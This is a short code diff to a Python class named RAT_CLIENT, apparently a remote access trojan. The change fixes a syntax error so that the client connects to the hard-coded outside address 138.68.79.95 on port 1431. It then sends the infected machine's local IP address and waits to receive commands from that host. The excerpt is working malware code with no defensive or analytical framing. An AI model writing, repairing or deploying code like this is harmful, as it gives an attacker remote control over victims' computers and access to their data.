@@ -46,7 +46,7 @@ class RAT_CLIENT:
         while not connected:  
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((138.68.79.95, 1431))
+                s.connect(('138.68.79.95', 1431))
                 sending = socket.gethostbyname(socket.gethostname())
                 s.send(sending.encode())
                 command = s.recv(1024).decode()
